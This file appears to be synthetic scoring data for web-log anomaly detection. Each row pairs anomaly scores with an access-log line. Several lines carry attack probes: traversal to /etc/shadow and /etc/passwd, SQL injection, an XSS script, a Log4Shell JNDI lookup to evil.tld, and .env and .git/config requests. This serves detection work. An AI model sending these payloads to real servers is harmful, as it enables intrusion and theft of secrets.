score_content,score_session,score_fused,line
106.95807647705078,,106.95807647705078,208.54.4.227 - - [10/Jan/2025:12:02:57 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 3667 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.26811936497688293,,0.26811936497688293,51.23.224.225 - - [10/Jan/2025:12:02:58 +0100] "GET /assets/app.css HTTP/1.1" 200 17788 "https://example.com/" "nikto/2.5.0"
107.1307144165039,,107.1307144165039,65.179.78.69 - - [10/Jan/2025:12:02:58 +0100] "TRACE /search?q=ssd HTTP/1.1" 200 17280 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
75.98680877685547,,75.98680877685547,43.10.152.85 - - [10/Jan/2025:12:02:59 +0100] "OPTIONS /search?q=monitor HTTP/1.1" 200 5596 "https://twitter.com/" "curl/7.85.0"
2.3349950313568115,,2.3349950313568115,13.201.207.73 - - [10/Jan/2025:12:03:01 +0100] "GET /assets/app.js HTTP/1.1" 304 7228 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
76.10486602783203,,76.10486602783203,148.148.196.76 - - [10/Jan/2025:12:03:01 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 204 19775 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30.962493896484375,,30.962493896484375,243.102.26.137 - - [10/Jan/2025:12:03:01 +0100] "DELETE /search?q=laptop HTTP/1.1" 200 12107 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
8.583548545837402,,8.583548545837402,211.98.106.88 - - [10/Jan/2025:12:03:01 +0100] "POST /api/product?id=123 HTTP/1.1" 200 16670 "-" "python-requests/2.31.0"
16.93709373474121,,16.93709373474121,12.6.249.27 - - [10/Jan/2025:12:03:04 +0100] "PUT /api/product?id=123 HTTP/1.1" 200 9976 "https://news.ycombinator.com/" "python-requests/2.31.0"
101.5177230834961,,101.5177230834961,175.221.45.91 - - [10/Jan/2025:12:03:05 +0100] "TRACE /wp-login.php HTTP/1.1" 200 13126 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.3501450717449188,,0.3501450717449188,1.144.230.162 - - [10/Jan/2025:12:03:05 +0100] "GET /index.html HTTP/1.1" 200 13228 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
1.9137362241744995,,1.9137362241744995,222.9.92.211 - - [10/Jan/2025:12:03:05 +0100] "GET / HTTP/1.1" 200 19292 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
30.97136116027832,,30.97136116027832,167.109.190.77 - - [10/Jan/2025:12:03:08 +0100] "DELETE /search?q=phone HTTP/1.1" 200 8626 "https://news.ycombinator.com/" "nikto/2.5.0"
107.04031372070312,,107.04031372070312,6.107.194.97 - - [10/Jan/2025:12:03:08 +0100] "TRACE /api/product?id=123 HTTP/1.1" 200 4802 "-" "curl/7.85.0"
12.633495330810547,,12.633495330810547,26.150.198.67 - - [10/Jan/2025:12:03:08 +0100] "PUT /api/products HTTP/1.1" 200 3032 "https://example.com/" "dirb/2.22"
73.99433135986328,,73.99433135986328,16.48.21.13 - - [10/Jan/2025:12:03:09 +0100] "OPTIONS /login HTTP/1.1" 304 18202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.3515830039978027,,2.3515830039978027,77.220.83.242 - - [10/Jan/2025:12:03:09 +0100] "GET /assets/app.css HTTP/1.1" 304 19962 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
107.00444793701172,,107.00444793701172,26.217.76.7 - - [10/Jan/2025:12:03:10 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 19135 "-" "nikto/2.5.0"
1.6769152879714966,,1.6769152879714966,164.150.137.60 - - [10/Jan/2025:12:03:13 +0100] "GET /logout HTTP/1.1" 200 12097 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
50.63706970214844,,50.63706970214844,114.118.102.151 - - [10/Jan/2025:12:03:16 +0100] "HEAD /search?q=router HTTP/1.1" 200 4273 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.36928129196167,,4.36928129196167,232.245.31.125 - - [10/Jan/2025:12:03:16 +0100] "POST /contact HTTP/1.1" 200 15329 "https://example.com/" "curl/7.85.0"
10.582125663757324,,10.582125663757324,210.132.62.129 - - [10/Jan/2025:12:03:16 +0100] "POST /search?q=laptop HTTP/1.1" 302 2034 "https://news.ycombinator.com/" "nikto/2.5.0"
76.05604553222656,,76.05604553222656,59.128.215.78 - - [10/Jan/2025:12:03:17 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 237 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
102.86589813232422,,102.86589813232422,142.231.73.169 - - [10/Jan/2025:12:03:20 +0100] "TRACE /contact HTTP/1.1" 200 13403 "-" "nikto/2.5.0"
26.85179901123047,,26.85179901123047,132.247.156.122 - - [10/Jan/2025:12:03:23 +0100] "DELETE /about HTTP/1.1" 200 18284 "https://www.google.com/" "nikto/2.5.0"
5.829678535461426,,5.829678535461426,19.54.209.111 - - [10/Jan/2025:12:03:23 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 14193 "-" "curl/7.85.0"
12.80019474029541,,12.80019474029541,207.174.123.242 - - [10/Jan/2025:12:03:24 +0100] "PUT /about HTTP/1.1" 200 12709 "https://www.google.com/" "python-requests/2.31.0"
50.67182922363281,,50.67182922363281,240.12.183.108 - - [10/Jan/2025:12:03:27 +0100] "HEAD /search?q=laptop HTTP/1.1" 200 14820 "https://www.google.com/" "python-requests/2.31.0"
5.852960109710693,,5.852960109710693,25.160.19.9 - - [10/Jan/2025:12:03:30 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 11142 "https://news.ycombinator.com/" "dirb/2.22"
3.7013473510742188,,3.7013473510742188,69.33.76.168 - - [10/Jan/2025:12:03:31 +0100] "GET /logout HTTP/1.1" 302 3256 "https://www.google.com/" "nikto/2.5.0"
46.55621337890625,,46.55621337890625,31.58.112.41 - - [10/Jan/2025:12:03:34 +0100] "HEAD /login HTTP/1.1" 200 19778 "https://twitter.com/" "sqlmap/1.7.2#stable"
52.689453125,,52.689453125,2.203.54.114 - - [10/Jan/2025:12:03:37 +0100] "HEAD /search?q=router HTTP/1.1" 301 6695 "https://news.ycombinator.com/" "nikto/2.5.0"
0.2699022591114044,,0.2699022591114044,128.243.179.216 - - [10/Jan/2025:12:03:37 +0100] "GET /assets/app.css HTTP/1.1" 200 18476 "https://www.google.com/" "python-requests/2.31.0"
102.7441635131836,,102.7441635131836,139.60.51.242 - - [10/Jan/2025:12:03:38 +0100] "TRACE /phpmyadmin HTTP/1.1" 201 3229 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
11.285072326660156,,11.285072326660156,80.47.139.39 - - [10/Jan/2025:12:03:40 +0100] "PUT /../../etc/passwd HTTP/1.1" 200 6803 "-" "curl/7.85.0"
50.6843376159668,,50.6843376159668,178.147.180.31 - - [10/Jan/2025:12:03:43 +0100] "HEAD /search?q=camera HTTP/1.1" 200 19542 "https://twitter.com/" "sqlmap/1.7.2#stable"
26.837324142456055,,26.837324142456055,98.231.154.132 - - [10/Jan/2025:12:03:45 +0100] "DELETE /login HTTP/1.1" 200 13059 "-" "Wget/1.21.2 (linux-gnu)"
11.590328216552734,,11.590328216552734,243.95.144.209 - - [10/Jan/2025:12:03:47 +0100] "PUT /.env HTTP/1.1" 200 3146 "https://twitter.com/" "dirb/2.22"
3.6180498600006104,,3.6180498600006104,157.61.254.225 - - [10/Jan/2025:12:03:50 +0100] "GET /api/products HTTP/1.1" 302 8293 "-" "python-requests/2.31.0"
5.812871932983398,,5.812871932983398,32.184.149.184 - - [10/Jan/2025:12:03:51 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 8907 "-" "nikto/2.5.0"
4.411041736602783,,4.411041736602783,13.214.209.231 - - [10/Jan/2025:12:03:52 +0100] "POST /admin HTTP/1.1" 200 8308 "https://twitter.com/" "curl/7.85.0"
16.022035598754883,,16.022035598754883,15.105.110.174 - - [10/Jan/2025:12:03:53 +0100] "POST /api/products HTTP/1.1" 429 975 "https://news.ycombinator.com/" "python-requests/2.31.0"
82.90148162841797,,82.90148162841797,227.177.184.54 - - [10/Jan/2025:12:03:55 +0100] "OPTIONS /about HTTP/1.1" 401 855 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
8.551384925842285,,8.551384925842285,39.94.196.178 - - [10/Jan/2025:12:03:57 +0100] "POST /search?q=laptop HTTP/1.1" 200 10478 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
8.46596908569336,,8.46596908569336,237.176.173.60 - - [10/Jan/2025:12:03:58 +0100] "POST /search?q=headphones HTTP/1.1" 200 5345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.23188476264476776,,0.23188476264476776,237.233.133.76 - - [10/Jan/2025:12:03:59 +0100] "GET /assets/app.css HTTP/1.1" 200 6256 "-" "python-requests/2.31.0"
8.555389404296875,,8.555389404296875,106.21.251.157 - - [10/Jan/2025:12:04:00 +0100] "POST /api/product?id=123 HTTP/1.1" 201 8328 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
50.67654800415039,,50.67654800415039,9.236.94.178 - - [10/Jan/2025:12:04:00 +0100] "HEAD /api/product?id=123 HTTP/1.1" 200 12471 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.3263766765594482,,2.3263766765594482,75.120.21.238 - - [10/Jan/2025:12:04:01 +0100] "GET /assets/app.css HTTP/1.1" 302 18891 "https://www.google.com/" "dirb/2.22"
3.773963212966919,,3.773963212966919,9.254.160.165 - - [10/Jan/2025:12:04:04 +0100] "GET /login HTTP/1.1" 301 19686 "https://www.google.com/" "curl/7.85.0"
30.989349365234375,,30.989349365234375,88.47.11.7 - - [10/Jan/2025:12:04:04 +0100] "DELETE /api/product?id=123 HTTP/1.1" 200 17453 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
14.698990821838379,,14.698990821838379,184.179.229.75 - - [10/Jan/2025:12:04:05 +0100] "PUT /api/products HTTP/1.1" 302 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
16.932025909423828,,16.932025909423828,166.175.137.188 - - [10/Jan/2025:12:04:05 +0100] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 19821 "-" "sqlmap/1.7.2#stable"
101.44888305664062,,101.44888305664062,139.97.237.230 - - [10/Jan/2025:12:04:08 +0100] "TRACE /../../etc/passwd HTTP/1.1" 200 18574 "https://www.google.com/" "sqlmap/1.7.2#stable"
26.717144012451172,,26.717144012451172,20.66.107.129 - - [10/Jan/2025:12:04:09 +0100] "DELETE /api/products HTTP/1.1" 200 18644 "https://twitter.com/" "curl/7.85.0"
44.970157623291016,,44.970157623291016,138.121.252.30 - - [10/Jan/2025:12:04:10 +0100] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17063 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.683250427246094,,26.683250427246094,49.158.99.16 - - [10/Jan/2025:12:04:13 +0100] "DELETE /dashboard HTTP/1.1" 200 3467 "-" "python-requests/2.31.0"
1.650550365447998,,1.650550365447998,70.253.241.176 - - [10/Jan/2025:12:04:15 +0100] "GET /logout HTTP/1.1" 200 4491 "https://example.com/" "sqlmap/1.7.2#stable"
11.272083282470703,,11.272083282470703,68.182.53.119 - - [10/Jan/2025:12:04:18 +0100] "PUT /cgi-bin/test.cgi HTTP/1.1" 200 2169 "https://www.google.com/" "python-requests/2.31.0"
107.00214385986328,,107.00214385986328,131.231.214.243 - - [10/Jan/2025:12:04:19 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 18206 "https://example.com/" "python-requests/2.31.0"
1.9078303575515747,,1.9078303575515747,43.57.35.166 - - [10/Jan/2025:12:04:22 +0100] "GET / HTTP/1.1" 200 17016 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
46.46553039550781,,46.46553039550781,68.223.154.86 - - [10/Jan/2025:12:04:23 +0100] "HEAD /contact HTTP/1.1" 200 10360 "https://example.com/" "dirb/2.22"
109.18535614013672,,109.18535614013672,73.159.65.114 - - [10/Jan/2025:12:04:23 +0100] "TRACE /search?q=ssd HTTP/1.1" 301 19987 "https://twitter.com/" "python-requests/2.31.0"
8.510421752929688,,8.510421752929688,161.212.223.94 - - [10/Jan/2025:12:04:25 +0100] "POST /search?q=headphones HTTP/1.1" 200 19686 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.33759552240371704,,0.33759552240371704,228.243.180.254 - - [10/Jan/2025:12:04:27 +0100] "GET /index.html HTTP/1.1" 200 9320 "https://news.ycombinator.com/" "dirb/2.22"
11.613044738769531,,11.613044738769531,147.137.114.95 - - [10/Jan/2025:12:04:29 +0100] "GET /assets/app.js HTTP/1.1" 401 8 "https://www.google.com/" "curl/7.85.0"
50.673336029052734,,50.673336029052734,50.188.57.13 - - [10/Jan/2025:12:04:31 +0100] "HEAD /search?q=phone HTTP/1.1" 200 8824 "https://news.ycombinator.com/" "python-requests/2.31.0"
10.672707557678223,,10.672707557678223,4.227.200.145 - - [10/Jan/2025:12:04:34 +0100] "POST /search?q=ssd HTTP/1.1" 302 10301 "https://twitter.com/" "nikto/2.5.0"
5.800057888031006,,5.800057888031006,215.211.202.173 - - [10/Jan/2025:12:04:34 +0100] "GET /search?q=monitor HTTP/1.1" 200 5332 "https://twitter.com/" "python-requests/2.31.0"
107.01592254638672,,107.01592254638672,61.116.77.49 - - [10/Jan/2025:12:04:36 +0100] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7004 "https://news.ycombinator.com/" "nikto/2.5.0"
0.2725864350795746,,0.2725864350795746,54.224.145.176 - - [10/Jan/2025:12:04:39 +0100] "GET /assets/app.js HTTP/1.1" 204 14818 "-" "curl/7.85.0"
0.2720586061477661,,0.2720586061477661,247.139.11.226 - - [10/Jan/2025:12:04:40 +0100] "GET /assets/app.js HTTP/1.1" 200 11640 "https://twitter.com/" "dirb/2.22"
46.41010665893555,,46.41010665893555,229.170.178.17 - - [10/Jan/2025:12:04:40 +0100] "HEAD /dashboard HTTP/1.1" 200 11301 "https://www.google.com/" "nikto/2.5.0"
1.5449962615966797,,1.5449962615966797,172.117.173.129 - - [10/Jan/2025:12:04:40 +0100] "GET /api/products HTTP/1.1" 200 2795 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
16.92265510559082,,16.92265510559082,107.114.101.102 - - [10/Jan/2025:12:04:43 +0100] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 204 2176 "https://example.com/" "python-requests/2.31.0"
674.8480834960938,,674.8480834960938,78.231.98.112 - - [10/Jan/2025:12:04:46 +0100] "TRACE /search?q=phone HTTP/1.1" 500 735 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.815041542053223,,12.815041542053223,52.52.170.78 - - [10/Jan/2025:12:04:46 +0100] "PUT /about HTTP/1.1" 200 18021 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.971601724624634,,3.971601724624634,1.48.175.184 - - [10/Jan/2025:12:04:48 +0100] "GET / HTTP/1.1" 304 12495 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
19.093589782714844,,19.093589782714844,26.1.93.29 - - [10/Jan/2025:12:04:50 +0100] "PUT /search?q=ssd HTTP/1.1" 304 18345 "https://example.com/" "nikto/2.5.0"
0.2753404974937439,,0.2753404974937439,64.15.220.69 - - [10/Jan/2025:12:04:51 +0100] "GET /assets/app.js HTTP/1.1" 200 12693 "-" "dirb/2.22"
5.825110912322998,,5.825110912322998,172.70.253.117 - - [10/Jan/2025:12:04:53 +0100] "GET /search?q=laptop HTTP/1.1" 200 7041 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.715003967285156,,26.715003967285156,140.235.149.35 - - [10/Jan/2025:12:04:53 +0100] "DELETE /dashboard HTTP/1.1" 200 13080 "https://news.ycombinator.com/" "dirb/2.22"
16.965736389160156,,16.965736389160156,81.51.111.55 - - [10/Jan/2025:12:04:53 +0100] "PUT /search?q=phone HTTP/1.1" 200 17426 "-" "python-requests/2.31.0"
32.898162841796875,,32.898162841796875,240.161.17.55 - - [10/Jan/2025:12:04:55 +0100] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 11095 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
41.99356460571289,,41.99356460571289,240.144.139.254 - - [10/Jan/2025:12:04:58 +0100] "DELETE /search?q=camera HTTP/1.1" 401 353 "https://example.com/" "python-requests/2.31.0"
12.6891450881958,,12.6891450881958,240.200.192.126 - - [10/Jan/2025:12:05:01 +0100] "GET /about HTTP/1.1" 400 762 "https://twitter.com/" "dirb/2.22"
0.34278202056884766,,0.34278202056884766,208.72.111.241 - - [10/Jan/2025:12:05:03 +0100] "GET /index.html HTTP/1.1" 200 10875 "https://www.google.com/" "sqlmap/1.7.2#stable"
0.25908011198043823,,0.25908011198043823,250.44.25.197 - - [10/Jan/2025:12:05:06 +0100] "GET /assets/app.css HTTP/1.1" 200 14500 "https://example.com/" "python-requests/2.31.0"
52.709468841552734,,52.709468841552734,222.196.83.75 - - [10/Jan/2025:12:05:07 +0100] "HEAD /api/product?id=123 HTTP/1.1" 302 5948 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
107.08535766601562,,107.08535766601562,118.129.75.186 - - [10/Jan/2025:12:05:10 +0100] "TRACE /search?q=phone HTTP/1.1" 201 17849 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2534388601779938,,0.2534388601779938,228.75.88.124 - - [10/Jan/2025:12:05:10 +0100] "GET /assets/app.css HTTP/1.1" 200 417 "https://news.ycombinator.com/" "curl/7.85.0"
0.2561836242675781,,0.2561836242675781,77.70.253.154 - - [10/Jan/2025:12:05:11 +0100] "GET /assets/app.css HTTP/1.1" 201 14350 "https://twitter.com/" "python-requests/2.31.0"
10.630849838256836,,10.630849838256836,126.139.154.86 - - [10/Jan/2025:12:05:11 +0100] "POST /api/product?id=123 HTTP/1.1" 302 13335 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
1.577919363975525,,1.577919363975525,56.70.45.68 - - [10/Jan/2025:12:05:13 +0100] "GET /api/products HTTP/1.1" 200 12680 "https://www.google.com/" "python-requests/2.31.0"
45.133060455322266,,45.133060455322266,239.140.102.87 - - [10/Jan/2025:12:05:16 +0100] "HEAD /.git/config HTTP/1.1" 200 7440 "https://example.com/" "curl/7.85.0"
26.74785614013672,,26.74785614013672,206.28.202.105 - - [10/Jan/2025:12:05:16 +0100] "DELETE /profile HTTP/1.1" 200 5410 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
102.76701354980469,,102.76701354980469,129.167.154.200 - - [10/Jan/2025:12:05:18 +0100] "TRACE /api/products HTTP/1.1" 200 5261 "-" "curl/7.85.0"
5.941573619842529,,5.941573619842529,216.46.172.251 - - [10/Jan/2025:12:05:21 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 10282 "https://example.com/" "curl/7.85.0"
46.440216064453125,,46.440216064453125,148.173.230.179 - - [10/Jan/2025:12:05:21 +0100] "HEAD /contact HTTP/1.1" 200 2179 "-" "sqlmap/1.7.2#stable"
1.6403971910476685,,1.6403971910476685,89.4.217.110 - - [10/Jan/2025:12:05:22 +0100] "GET /profile HTTP/1.1" 200 10473 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.326426982879639,,4.326426982879639,235.223.126.156 - - [10/Jan/2025:12:05:25 +0100] "POST /contact HTTP/1.1" 204 1040 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.31270599365234,,70.31270599365234,233.54.58.232 - - [10/Jan/2025:12:05:26 +0100] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 204 423 "-" "curl/7.85.0"
26.704872131347656,,26.704872131347656,166.230.129.98 - - [10/Jan/2025:12:05:27 +0100] "DELETE /api/products HTTP/1.1" 200 14114 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
572.1323852539062,,572.1323852539062,75.50.96.203 - - [10/Jan/2025:12:05:30 +0100] "POST /api/products HTTP/1.1" 502 614 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.839074611663818,,5.839074611663818,46.35.178.117 - - [10/Jan/2025:12:05:31 +0100] "GET /search?q=monitor HTTP/1.1" 200 17601 "https://twitter.com/" "dirb/2.22"
76.00038146972656,,76.00038146972656,59.84.85.44 - - [10/Jan/2025:12:05:32 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 1341 "-" "Wget/1.21.2 (linux-gnu)"
16.917739868164062,,16.917739868164062,229.75.227.215 - - [10/Jan/2025:12:05:34 +0100] "PUT /search?q=laptop HTTP/1.1" 200 8360 "https://www.google.com/" "dirb/2.22"
73.84793853759766,,73.84793853759766,228.224.189.237 - - [10/Jan/2025:12:05:36 +0100] "OPTIONS /phpmyadmin HTTP/1.1" 304 19440 "-" "curl/7.85.0"
1.5489708185195923,,1.5489708185195923,167.130.124.94 - - [10/Jan/2025:12:05:39 +0100] "GET /api/products HTTP/1.1" 200 4267 "-" "curl/7.85.0"
5.904125690460205,,5.904125690460205,67.90.180.169 - - [10/Jan/2025:12:05:42 +0100] "GET /search?q=ssd HTTP/1.1" 204 14133 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.355688095092773,,4.355688095092773,225.249.171.128 - - [10/Jan/2025:12:05:45 +0100] "POST /contact HTTP/1.1" 200 10837 "https://example.com/" "sqlmap/1.7.2#stable"
102.85698699951172,,102.85698699951172,126.222.182.75 - - [10/Jan/2025:12:05:48 +0100] "TRACE /contact HTTP/1.1" 200 10536 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
75.97137451171875,,75.97137451171875,213.163.122.141 - - [10/Jan/2025:12:05:50 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 200 15813 "-" "curl/7.85.0"
5.883763313293457,,5.883763313293457,153.74.48.47 - - [10/Jan/2025:12:05:53 +0100] "GET /search?q=ssd HTTP/1.1" 200 5325 "https://twitter.com/" "nikto/2.5.0"
12.753449440002441,,12.753449440002441,2.145.8.216 - - [10/Jan/2025:12:05:53 +0100] "PUT /profile HTTP/1.1" 200 18945 "https://news.ycombinator.com/" "curl/7.85.0"
83.32093048095703,,83.32093048095703,52.28.191.116 - - [10/Jan/2025:12:05:53 +0100] "OPTIONS /api/products HTTP/1.1" 401 1 "https://news.ycombinator.com/" "curl/7.85.0"
0.28900954127311707,,0.28900954127311707,84.143.101.90 - - [10/Jan/2025:12:05:56 +0100] "GET /assets/app.js HTTP/1.1" 200 17504 "https://news.ycombinator.com/" "nikto/2.5.0"
50.66496658325195,,50.66496658325195,93.202.172.230 - - [10/Jan/2025:12:05:56 +0100] "HEAD /search?q=laptop HTTP/1.1" 201 13311 "https://news.ycombinator.com/" "nikto/2.5.0"
75.94469451904297,,75.94469451904297,220.91.44.121 - - [10/Jan/2025:12:05:58 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 201 8060 "https://example.com/" "sqlmap/1.7.2#stable"
47.009883880615234,,47.009883880615234,108.47.231.209 - - [10/Jan/2025:12:05:59 +0100] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 302 11398 "https://news.ycombinator.com/" "nikto/2.5.0"
71.86514282226562,,71.86514282226562,112.205.51.250 - - [10/Jan/2025:12:06:02 +0100] "OPTIONS /logout HTTP/1.1" 200 11696 "https://twitter.com/" "nikto/2.5.0"
70.32659912109375,,70.32659912109375,11.110.13.212 - - [10/Jan/2025:12:06:02 +0100] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 14409 "https://www.google.com/" "nikto/2.5.0"
75.88164520263672,,75.88164520263672,194.136.91.148 - - [10/Jan/2025:12:06:03 +0100] "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/1.1" 201 5277 "https://twitter.com/" "nikto/2.5.0"
26.66057014465332,,26.66057014465332,55.49.152.227 - - [10/Jan/2025:12:06:03 +0100] "DELETE /api/products HTTP/1.1" 204 3267 "-" "dirb/2.22"
2.812568426132202,,2.812568426132202,165.211.121.34 - - [10/Jan/2025:12:06:04 +0100] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 2749 "https://www.google.com/" "sqlmap/1.7.2#stable"
4.987610816955566,,4.987610816955566,254.229.55.234 - - [10/Jan/2025:12:06:05 +0100] "POST /cgi-bin/test.cgi HTTP/1.1" 304 810 "https://news.ycombinator.com/" "python-requests/2.31.0"
42.0217170715332,,42.0217170715332,91.89.179.36 - - [10/Jan/2025:12:06:07 +0100] "DELETE /api/product?id=123 HTTP/1.1" 403 1015 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
28.78820037841797,,28.78820037841797,250.98.107.170 - - [10/Jan/2025:12:06:10 +0100] "DELETE /dashboard HTTP/1.1" 302 17701 "https://example.com/" "python-requests/2.31.0"
48.59929275512695,,48.59929275512695,250.225.214.231 - - [10/Jan/2025:12:06:11 +0100] "HEAD /about HTTP/1.1" 304 7503 "https://twitter.com/" "dirb/2.22"
26.806781768798828,,26.806781768798828,197.63.229.253 - - [10/Jan/2025:12:06:13 +0100] "DELETE /admin HTTP/1.1" 200 1418 "-" "curl/7.85.0"
8.652690887451172,,8.652690887451172,127.88.32.178 - - [10/Jan/2025:12:06:16 +0100] "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 9561 "https://example.com/" "curl/7.85.0"
32.99866485595703,,32.99866485595703,69.174.98.70 - - [10/Jan/2025:12:06:17 +0100] "DELETE /search?q=laptop HTTP/1.1" 301 8633 "https://example.com/" "python-requests/2.31.0"
25.31085205078125,,25.31085205078125,66.35.84.96 - - [10/Jan/2025:12:06:18 +0100] "DELETE /cgi-bin/test.cgi HTTP/1.1" 200 3650 "https://news.ycombinator.com/" "dirb/2.22"
